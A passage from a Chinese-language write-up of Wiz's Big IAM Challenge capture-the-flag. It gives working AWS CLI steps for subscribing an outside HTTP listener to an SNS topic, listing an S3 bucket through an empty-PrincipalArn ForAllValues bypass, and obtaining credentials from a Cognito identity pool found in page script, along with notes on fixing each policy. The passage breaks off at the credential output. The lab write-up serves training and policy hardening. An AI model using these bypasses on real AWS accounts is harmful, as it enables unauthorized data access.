&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> http.server
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> socketserver
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> urllib.parse
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>PORT &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">40001&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">class&lt;/span> &lt;span style="color:#a6e22e">CustomHandler&lt;/span>(http&lt;span style="color:#f92672">.&lt;/span>server&lt;span style="color:#f92672">.&lt;/span>SimpleHTTPRequestHandler):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">do_POST&lt;/span>(self):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> self&lt;span style="color:#f92672">.&lt;/span>path &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#e6db74">&amp;#39;/@tbic.wiz.io&amp;#39;&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e"># 获取并打印请求内容&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> content_length &lt;span style="color:#f92672">=&lt;/span> int(self&lt;span style="color:#f92672">.&lt;/span>headers[&lt;span style="color:#e6db74">&amp;#39;Content-Length&amp;#39;&lt;/span>])
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> post_data &lt;span style="color:#f92672">=&lt;/span> self&lt;span style="color:#f92672">.&lt;/span>rfile&lt;span style="color:#f92672">.&lt;/span>read(content_length)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> print(&lt;span style="color:#e6db74">f&lt;/span>&lt;span style="color:#e6db74">&amp;#34;Body: &lt;/span>&lt;span style="color:#e6db74">{&lt;/span>post_data&lt;span style="color:#f92672">.&lt;/span>decode(&lt;span style="color:#e6db74">&amp;#39;utf-8&amp;#39;&lt;/span>)&lt;span style="color:#e6db74">}&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e"># 发送响应&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> self&lt;span style="color:#f92672">.&lt;/span>send_response(&lt;span style="color:#ae81ff">200&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> self&lt;span style="color:#f92672">.&lt;/span>send_header(&lt;span style="color:#e6db74">&amp;#34;Content-type&amp;#34;&lt;/span>, &lt;span style="color:#e6db74">&amp;#34;text/html&amp;#34;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> self&lt;span style="color:#f92672">.&lt;/span>end_headers()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> self&lt;span style="color:#f92672">.&lt;/span>wfile&lt;span style="color:#f92672">.&lt;/span>write(&lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#34;POST request received!&amp;#34;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">else&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> self&lt;span style="color:#f92672">.&lt;/span>send_response(&lt;span style="color:#ae81ff">404&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> self&lt;span style="color:#f92672">.&lt;/span>end_headers()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> self&lt;span style="color:#f92672">.&lt;/span>wfile&lt;span style="color:#f92672">.&lt;/span>write(&lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#34;404 Not Found&amp;#34;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">with&lt;/span> socketserver&lt;span style="color:#f92672">.&lt;/span>TCPServer((&lt;span style="color:#e6db74">&amp;#34;&amp;#34;&lt;/span>, PORT), CustomHandler) &lt;span style="color:#66d9ef">as&lt;/span> httpd:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> print(&lt;span style="color:#e6db74">f&lt;/span>&lt;span style="color:#e6db74">&amp;#34;Serving at port &lt;/span>&lt;span style="color:#e6db74">{&lt;/span>PORT&lt;span style="color:#e6db74">}&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> httpd&lt;span style="color:#f92672">.&lt;/span>serve_forever()
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>在具有公网的服务器上建立HTTP 服务器&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ python3 custom_server.py
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>回到wiz提供的aws cli，执行发送订阅请求&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ aws sns subscribe --topic-arn arn:aws:sns:us-east-1:092297851374:TBICWizPushNotifications --protocol http --notification-endpoint http://&amp;lt;公网IP&amp;gt;:40001/@tbic.wiz.io
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>HTTP 服务器将接收到sns服务的订阅确认通知&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-json" data-lang="json">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010">Body:&lt;/span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;Type&amp;#34;&lt;/span> : &lt;span style="color:#e6db74">&amp;#34;SubscriptionConfirmation&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;MessageId&amp;#34;&lt;/span> : &lt;span style="color:#e6db74">&amp;#34;3d983eb2-8a8e-4614-b795-3f01692f723f&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;Token&amp;#34;&lt;/span> : &lt;span style="color:#e6db74">&amp;#34;2336412f37fb687f5d51e6e2425ba1f259d6d4f96ad658d77066b1894033b23fcf59f464f708a4ef0dc15d9aa6e96007f71889162b85d711d391dd65dbc4225c5ad392b742ef34885791d035d8bb324f390ec9e5526351fc90bd8846c7c9a59522d3f4d2aae89ba10a1062e3936ceabdf0e8c61df5cf7bfc619cabe8a61b5f2b&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;TopicArn&amp;#34;&lt;/span> : &lt;span style="color:#e6db74">&amp;#34;arn:aws:sns:us-east-1:092297851374:TBICWizPushNotifications&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;Message&amp;#34;&lt;/span> : &lt;span style="color:#e6db74">&amp;#34;You have chosen to subscribe to the topic arn:aws:sns:us-east-1:092297851374:TBICWizPushNotifications.\nTo confirm the subscription, visit the SubscribeURL included in this message.&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;SubscribeURL&amp;#34;&lt;/span> : &lt;span style="color:#e6db74">&amp;#34;https://sns.us-east-1.amazonaws.com/?Action=ConfirmSubscription&amp;amp;TopicArn=arn:aws:sns:us-east-1:092297851374:TBICWizPushNotifications&amp;amp;Token=2336412f37fb687f5d51e6e2425ba1f259d6d4f96ad658d77066b1894033b23fcf59f464f708a4ef0dc15d9aa6e96007f71889162b85d711d391dd65dbc4225c5ad392b742ef34885791d035d8bb324f390ec9e5526351fc90bd8846c7c9a59522d3f4d2aae89ba10a1062e3936ceabdf0e8c61df5cf7bfc619cabe8a61b5f2b&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;Timestamp&amp;#34;&lt;/span> : &lt;span style="color:#e6db74">&amp;#34;2024-08-31T16:29:00.462Z&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;SignatureVersion&amp;#34;&lt;/span> : &lt;span style="color:#e6db74">&amp;#34;1&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;Signature&amp;#34;&lt;/span> : &lt;span style="color:#e6db74">&amp;#34;UIuJmvf4gxkVCoIj5rdsWQd9FE7IYTTM/dyVKnOiSBTBTf8DiaEm7Ric1QutD9QkLTpIO51uwmooQfMPE5bqpjPPyxh/bT1iR1zwu570VDTvnUD27/f6Ydzs3Z7G6pYAa4bwItsRzi26AZ5DmQs2J4dTjhWKXjLZbVlOMh+DDtzkFHT6kLRu1Ur2HUdXQN+BGky52BqJy1l1eGw2BueXPo155P/IHpGGQNB12p3doSeroKayt25KjEqc4CVgWbMltXpkCUQop8ek9fJE2427sLYESJqKC5nmSzb9NxFJNvZN744GgBemTUYmPACBcc677+eps1D/vNw9gKduoKwNXg==&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;SigningCertURL&amp;#34;&lt;/span> : &lt;span style="color:#e6db74">&amp;#34;https://sns.us-east-1.amazonaws.com/SimpleNotificationService-60eadc530605d63b8e62a523676ef735.pem&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>将上述Body中的Token替换下述的&lt;!-- raw HTML omitted -->后发送确认订阅的命令&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ aws sns confirm-subscription --topic-arn arn:aws:sns:us-east-1:092297851374:TBICWizPushNotifications --token &amp;lt;Token&amp;gt;
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>HTTP 服务器将持续接收到sns服务消息，内容包含flag&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-json" data-lang="json">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010">Body:&lt;/span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;Type&amp;#34;&lt;/span> : &lt;span style="color:#e6db74">&amp;#34;Notification&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;MessageId&amp;#34;&lt;/span> : &lt;span style="color:#e6db74">&amp;#34;f8823847-feb3-52a4-b7f9-670ab783fc6d&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;TopicArn&amp;#34;&lt;/span> : &lt;span style="color:#e6db74">&amp;#34;arn:aws:sns:us-east-1:092297851374:TBICWizPushNotifications&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;Message&amp;#34;&lt;/span> : &lt;span style="color:#e6db74">&amp;#34;{wiz:always-suspect-asterisks}&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;Timestamp&amp;#34;&lt;/span> : &lt;span style="color:#e6db74">&amp;#34;2024-08-31T16:38:08.443Z&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;SignatureVersion&amp;#34;&lt;/span> : &lt;span style="color:#e6db74">&amp;#34;1&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;Signature&amp;#34;&lt;/span> : &lt;span style="color:#e6db74">&amp;#34;gPvG0m3pZl8cD5vMVLflZ1xkKbCdXib2vQr70qkpWL30ChVNE4oiD2L5I3F/8jxEPbtd+sji5aGl7diSJAXbkR780SemEA54VT+k/doRNsX8tthFnI7ergaLebggi00/maER3oELRL9HQLYeQl4H9n+E+DxZCD+YPl6eIcpnAElqVLoFo0w+bLgd/RWy1DzzwtRpygRgeN6e98WGS4aqqOVrCXfi7p/wXt3UH1OSSMxs/uekjPyElF8ywzsmq8y1j3RgifuZdDsHtgVSYKsdy8sypvnTG04cz3lCmX6XNQKp2FzN/jtasmiuTrn1gwm3FqXUYj65HYn20FPga8BcZA==&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;SigningCertURL&amp;#34;&lt;/span> : &lt;span style="color:#e6db74">&amp;#34;https://sns.us-east-1.amazonaws.com/SimpleNotificationService-60eadc530605d63b8e62a523676ef735.pem&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;UnsubscribeURL&amp;#34;&lt;/span> : &lt;span style="color:#e6db74">&amp;#34;https://sns.us-east-1.amazonaws.com/?Action=Unsubscribe&amp;amp;SubscriptionArn=arn:aws:sns:us-east-1:092297851374:TBICWizPushNotifications:dbd2a329-edde-43e1-88ea-19ceadc436b6&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="思考-2">思考&lt;/h3>
&lt;p>尽管此策略使用了 &lt;code>StringLike&lt;/code> 条件对订阅的终端节点进行了限制，但仅考虑了电子邮件终端的情况，存在被绕过的风险。&lt;/p>
&lt;h2 id="challenge-4-admin-only">Challenge 4: Admin only?&lt;/h2>
&lt;h3 id="解题-3">解题&lt;/h3>
&lt;p>查看View IAM Policys&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-yaml" data-lang="yaml">&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;Version&amp;#34;: &lt;/span>&lt;span style="color:#e6db74">&amp;#34;2012-10-17&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;Statement&amp;#34;: &lt;/span>[
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;Effect&amp;#34;: &lt;/span>&lt;span style="color:#e6db74">&amp;#34;Allow&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;Principal&amp;#34;: &lt;/span>&lt;span style="color:#e6db74">&amp;#34;*&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;Action&amp;#34;: &lt;/span>&lt;span style="color:#e6db74">&amp;#34;s3:GetObject&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;Resource&amp;#34;: &lt;/span>&lt;span style="color:#e6db74">&amp;#34;arn:aws:s3:::thebigiamchallenge-admin-storage-abf1321/*&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> },
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;Effect&amp;#34;: &lt;/span>&lt;span style="color:#e6db74">&amp;#34;Allow&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;Principal&amp;#34;: &lt;/span>&lt;span style="color:#e6db74">&amp;#34;*&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;Action&amp;#34;: &lt;/span>&lt;span style="color:#e6db74">&amp;#34;s3:ListBucket&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;Resource&amp;#34;: &lt;/span>&lt;span style="color:#e6db74">&amp;#34;arn:aws:s3:::thebigiamchallenge-admin-storage-abf1321&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;Condition&amp;#34;: &lt;/span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;StringLike&amp;#34;: &lt;/span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;s3:prefix&amp;#34;: &lt;/span>&lt;span style="color:#e6db74">&amp;#34;files/*&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> },
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;ForAllValues:StringLike&amp;#34;: &lt;/span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;aws:PrincipalArn&amp;#34;: &lt;/span>&lt;span style="color:#e6db74">&amp;#34;arn:aws:iam::133713371337:user/admin&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ]
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>这个策略包含两个声明，定义了对特定 S3 存储桶的访问权限：&lt;/p>
&lt;ol>
&lt;li>允许所有用户对存储桶 thebigiamchallenge-admin-storage-abf1321 中的所有对象执行 s3:GetObject 操作。&lt;/li>
&lt;li>允许所有用户对存储桶 thebigiamchallenge-admin-storage-abf1321 执行 s3:ListBucket 操作，但仅限于符合以下条件的请求：&lt;/li>
&lt;/ol>
&lt;ul>
&lt;li>请求的前缀为 files/*。&lt;/li>
&lt;li>请求者的 ARN 为 arn:aws:iam::133713371337:user/admin，但在参考&lt;a href="https://docs.aws.amazon.com/zh_cn/IAM/latest/UserGuide/reference_policies_condition-single-vs-multi-valued-context-keys.html#reference_policies_condition-multi-valued-context-keys">AWS Doc&lt;/a>中指出如果请求上下文中意外出现缺失的上下文键或具有空值的上下文键，存在被绕过的风险。&lt;/li>
&lt;/ul>
&lt;p>有以下两种方式可以在发送请求时，让 &lt;code>aws:PrincipalArn&lt;/code> 值为空：
第一种为直接使用浏览器访问https://s3.amazonaws.com/thebigiamchallenge-admin-storage-abf1321?prefix=files/
第二种则是使用以下命令&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ aws s3 ls s3://thebigiamchallenge-admin-storage-abf1321/files/ --no-sign-request
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>2023-06-07 19:15:43 &lt;span style="color:#ae81ff">42&lt;/span> flag-as-admin.txt
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>2023-06-08 19:20:01 &lt;span style="color:#ae81ff">81889&lt;/span> logo-admin.png
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ aws s3 cp s3://thebigiamchallenge-admin-storage-abf1321/files/flag-as-admin.txt -
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">{&lt;/span>wiz:principal-arn-is-not-what-you-think&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="思考-3">思考&lt;/h3>
&lt;p>在策略配置中，要注意授权主体的限制条件是否使用了 &lt;code>ForAllValues&lt;/code>。可以考虑将 &lt;code>ForAllValues&lt;/code> 替换为 &lt;code>ForAnyValue&lt;/code>。如果键值为空，&lt;code>ForAnyValue&lt;/code> 会返回 &lt;code>False&lt;/code>，而不是 &lt;code>True&lt;/code>。这样，如果是未授权的访问，就会提示 &lt;code>AccessDenied&lt;/code>。&lt;/p>
&lt;h2 id="challenge-5-do-i-know-you">Challenge 5: Do I know you?&lt;/h2>
&lt;h3 id="解题-4">解题&lt;/h3>
&lt;p>查看View IAM Policys&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-yaml" data-lang="yaml">&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;Version&amp;#34;: &lt;/span>&lt;span style="color:#e6db74">&amp;#34;2012-10-17&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;Statement&amp;#34;: &lt;/span>[
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;Sid&amp;#34;: &lt;/span>&lt;span style="color:#e6db74">&amp;#34;VisualEditor0&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;Effect&amp;#34;: &lt;/span>&lt;span style="color:#e6db74">&amp;#34;Allow&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;Action&amp;#34;: &lt;/span>[
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;mobileanalytics:PutEvents&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;cognito-sync:*&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ],
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;Resource&amp;#34;: &lt;/span>&lt;span style="color:#e6db74">&amp;#34;*&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> },
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;Sid&amp;#34;: &lt;/span>&lt;span style="color:#e6db74">&amp;#34;VisualEditor1&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;Effect&amp;#34;: &lt;/span>&lt;span style="color:#e6db74">&amp;#34;Allow&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;Action&amp;#34;: &lt;/span>[
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;s3:GetObject&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;s3:ListBucket&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ],
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;Resource&amp;#34;: &lt;/span>[
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;arn:aws:s3:::wiz-privatefiles&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;arn:aws:s3:::wiz-privatefiles/*&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ]
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ]
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>这个策略包含两个声明，定义了对特定 AWS 服务和资源的访问权限：&lt;/p>
&lt;ol>
&lt;li>允许对所有资源执行以下操作：&lt;/li>
&lt;/ol>
&lt;ul>
&lt;li>mobileanalytics:PutEvents: 允许调用 Amazon Mobile Analytics 的 PutEvents 操作。&lt;/li>
&lt;li>cognito-sync:*: 允许调用 Amazon Cognito Sync 的所有操作。&lt;/li>
&lt;/ul>
&lt;ol start="2">
&lt;li>允许对特定 S3 存储桶和其对象执行以下操作：&lt;/li>
&lt;/ol>
&lt;ul>
&lt;li>s3:GetObject: 允许获取 S3 对象的操作。&lt;/li>
&lt;li>s3:ListBucket: 允许列出 S3 存储桶内容的操作。&lt;/li>
&lt;li>资源限定为 arn:aws:s3:::wiz-privatefiles 和 arn:aws:s3:::wiz-privatefiles/*，即特定的 S3 存储桶及其所有对象。&lt;/li>
&lt;/ul>
&lt;p>参考&lt;a href="https://docs.aws.amazon.com/zh_cn/cognito/latest/developerguide/what-is-amazon-cognito.html">AWS Doc&lt;/a>，可以了解到Amazon Cognito提供了一个用于 Web 和移动应用程序的身份平台。我们需要思考如何通过特定的身份池获取用户凭证，从而最终获得对 S3 的访问权限。
第一步是如何获取可能包含用户凭证的identity pool ID，开启浏览器的开发者工具，搜索&lt;code>wiz-privatefiles&lt;/code>关键字
&lt;img alt="script" src="/img/2024/wiz-the-big-iam-challenge-1.jpg">&lt;/p>
&lt;p>根据上述java script代码，得知通过IdentityPoolId(us-east-1:b73cb2d2-0d00-4e77-8e80-f99d9c13da3b)获取访问wiz-privatefiles存储桶的凭证
使用aws cli复现上述java script代码&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ aws cognito-identity get-id --identity-pool-id us-east-1:b73cb2d2-0d00-4e77-8e80-f99d9c13da3b
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;IdentityId&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;us-east-1:157d6171-ee96-ce56-8cea-da3d8f2677c3&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ aws cognito-identity get-credentials-for-identity --identity-id us-east-1:157d6171-ee96-ce56-8cea-da3d8f2677c3
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;IdentityId&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;us-east-1:157d6171-ee96-ce56-8cea-da3d8f2677c3&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;Credentials&amp;#34;&lt;/span>: &lt;span style="color:#f92672">{&lt;/span>
